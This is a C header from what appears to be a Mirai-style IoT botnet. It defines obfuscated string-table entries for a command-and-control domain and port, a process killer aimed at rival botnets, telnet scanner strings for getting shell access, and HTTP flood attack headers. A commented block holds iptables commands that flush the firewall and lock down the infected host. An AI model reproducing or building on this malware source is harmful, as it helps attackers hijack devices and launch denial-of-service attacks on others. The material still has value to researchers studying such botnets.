#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

/* Generic bot info */
#define TABLE_EXEC_SUCCESS              1
#define TABLE_CNC_PORT              	2
          
/* Killer data */          
#define TABLE_KILLER_SAFE               3
#define TABLE_KILLER_PROC               4
#define TABLE_KILLER_EXE                5
#define TABLE_KILLER_FD                 6   /* "/fd" */
#define TABLE_KILLER_MAPS               7
#define TABLE_KILLER_TCP                8
#define TABLE_KILLER_ARES				9
#define TABLE_KILLER_HITO				10
#define TABLE_KILLER_HORIZON			11
#define TABLE_KILLER_PLEX				12
#define TABLE_KILLER_HILIX				13
#define TABLE_KILLER_MANA				14
#define TABLE_KILLER_AKIRU				15
#define TABLE_KILLER_AMACANO			16
#define TABLE_KILLER_HOHO				17
#define TABLE_KILLER_HYBRID				18
#define TABLE_KILLER_KALON				19
#define TABLE_KILLER_KANASHI			20
#define TABLE_KILLER_KURIA				21
#define TABLE_KILLER_LEET				22
#define TABLE_KILLER_MESSIAH			23
#define TABLE_RANDOM					24
#define TABLE_KILLER_KOWAI				25
#define TABLE_KILLER_OWARI2				26
#define TABLE_KILLER_TOKYO				27
#define TABLE_KILLER_TSUNAMI			28
#define TABLE_KILLER_ICE				29
#define TABLE_KILLER_YAKUZA				30
#define TABLE_KILLER_ZEHIR				31
#define TABLE_KILLER_HITORI				32
#define TABLE_KILLER_OKANE				33

/* Scanner data */          
#define TABLE_SCAN_SHELL                34  /* 'shell' to enable shell access */
#define TABLE_SCAN_ENABLE               35  /* 'enable' to enable shell access */
#define TABLE_SCAN_SYSTEM               36  /* 'system' to enable shell access */
#define TABLE_SCAN_SH                   37  /* 'sh' to enable shell access */
#define TABLE_SCAN_LSHELL               38   /* 'linuxshell' */
#define TABLE_SCAN_QUERY                39  /* echo hex string to verify login */
#define TABLE_SCAN_RESP                 40  /* utf8 version of query string */
#define TABLE_SCAN_NCORRECT             41  /* 'ncorrect' to fast-check for invalid password */
#define TABLE_SCAN_OGIN					42
#define TABLE_SCAN_ASSWORD				43
#define TABLE_SCAN_ENTER				44
          
/* Attack strings */          
#define TABLE_ATK_VSE                   45  /* TSource Engine Query */
#define TABLE_ATK_RESOLVER              46  /* /etc/resolv.conf */
#define TABLE_ATK_NSERV                 47  /* "nameserver " */

#define TABLE_ATK_KEEP_ALIVE            48  /* "Connection: keep-alive" */
#define TABLE_ATK_ACCEPT                49  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
#define TABLE_ATK_ACCEPT_LNG            50  // "Accept-Language: en-US,en;q=0.8"
#define TABLE_ATK_CONTENT_TYPE          51  // "Content-Type: application/x-www-form-urlencoded"
#define TABLE_ATK_SET_COOKIE            52  // "setCookie('"
#define TABLE_ATK_REFRESH_HDR           53  // "refresh:"
#define TABLE_ATK_LOCATION_HDR          54  // "location:"
#define TABLE_ATK_SET_COOKIE_HDR        55  // "set-cookie:"
#define TABLE_ATK_CONTENT_LENGTH_HDR    56  // "content-length:"
#define TABLE_ATK_TRANSFER_ENCODING_HDR 57  // "transfer-encoding:"
#define TABLE_ATK_CHUNKED               58  // "chunked"
#define TABLE_ATK_KEEP_ALIVE_HDR        59  // "keep-alive"
#define TABLE_ATK_CONNECTION_HDR        60  // "connection:"
#define TABLE_ATK_DOSARREST             61  // "server: dosarrest"
#define TABLE_ATK_CLOUDFLARE_NGINX      62  // "server: cloudflare-nginx"
#define TABLE_ATK_HTTP					63  // "HTTP/1.1"
#define TABLE_ATK_USERAGENT 			64  // "User-Agent:"
#define TABLE_HTTP_HOST					65  // "Host:"
#define TABLE_HTTP_COOKIE				66  // "Cookie:"
#define TABLE_ATK_SEARCHHTTP			67  // "http"
#define TABLE_ATK_URL                   68  // "url="
#define TABLE_ATK_POST					69  // "POST"
#define TABLE_ATK_POSTCGI				70  // 

/* User agent strings */
#define TABLE_HTTP_ONE                  71  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_TWO                  72  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_THREE                73  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_FOUR                 74  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_FIVE                 75  /* "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" */
#define TABLE_WATCHDOG_1				76
#define TABLE_WATCHDOG_2				77
#define TABLE_WATCHDOG_3				78
#define TABLE_WATCHDOG_4				79
#define TABLE_WATCHDOG_5				80
#define TABLE_WATCHDOG_6				81
#define TABLE_WATCHDOG_7				82
#define TABLE_WATCHDOG_8				83
#define TABLE_WATCHDOG_9                84	

#define TABLE_KILLER_DELETED            85   /* " (deleted)" */
/*
#define TABLE_FIREWALL_DELETE           86  //iptables -F
#define TABLE_FIREWALL_SESSION			87	//iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
#define TABLE_FIREWALL_IPORT			88  // iptables -I INPUT -p tcp --dport 30101 -j ACCEPT
#define TABLE_FIREWALL_OPORT			89	// iptables -A OUTPUT -p tcp --dport 30101 -j ACCEPT
#define TABLE_FIREWALL_I80				90  // iptables -I INPUT -p tcp --dport 80 -j ACCEPT
#define TABLE_FIREWALL_O80				91  // iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
#define TABLE_FIREWALL_I23				92  // iptables -I INPUT -p tcp --dport 23 -j ACCEPT
#define TABLE_FIREWALL_O23				93  // iptables -A OUTPUT -p tcp --dport 23 -j ACCEPT
#define TABLE_FIREWALL_I443				94  // iptables -I INPUT -p tcp --dport 443 -j ACCEPT
#define TABLE_FIREWALL_O443				95  // iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
#define TABLE_FIREWALL_I53				96  // iptables -I INPUT -p udp --dport 53 -j ACCEPT
#define TABLE_FIREWALL_O53 				97  // iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
#define TABLE_FIREWALL_I2323			98  // iptables -I INPUT -p tcp --dport 2323 -j ACCEPT
#define TABLE_FIREWALL_O2323			99  // iptables -A OUTPUT -p tcp --dport 2323 -j ACCEPT
#define TABLE_FIREWALL_ISECRET			100 // iptables -I INPUT -p tcp --dport 79 -j ACCEPT
#define TABLE_FIREWALL_OSECRET			101  // iptables -A OUTPUT -p tcp --dport 79 -j ACCEPT
#define TABLE_FIREWALL_IBLOCKALL		102 // iptables -I INPUT -j DROP
#define TABLE_FIREWALL_OBLOCKALL		103 // iptables -A OUTPUT -j DROP
*/
#define TABLE_KILLER_QBOT1 				86
#define TABLE_KILLER_QBOT2 				87
#define TABLE_KILLER_QBOT3 				88
#define TABLE_KILLER_UPX 				89
#define TABLE_KILLER_ROUTE 				90
#define TABLE_KILLER_RC 				91
#define TABLE_KILLER_BINSH 				92
#define TABLE_KILLER_TAORETA			93
#define TABLE_KILLER_SWITCHBLADE		94
#define TABLE_KILLER_INFERNO1			95

#define TABLE_HTTP_SIX					96
#define TABLE_HTTP_SEVEN				97
#define TABLE_HTTP_EIGHT				98
#define TABLE_HTTP_NINE					99
#define TABLE_HTTP_TEN					100
#define TABLE_HTTP_ELEVEN				101
#define TABLE_HTTP_TWELVE				102
#define TABLE_HTTP_THIRTEEN				103
#define TABLE_HTTP_FOURTEEN				104
#define TABLE_HTTP_FIFTEEN				105

#define TABLE_CNC_DOMAIN                106
#define TABLE_SCAN_CB_PORT              107
#define TABLE_SCAN_DEVELOPMENT          108
#define TABLE_SCAN_FIREWALL             109

#define TABLE_MAX_KEYS  110 /* Highest value + 1 */

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
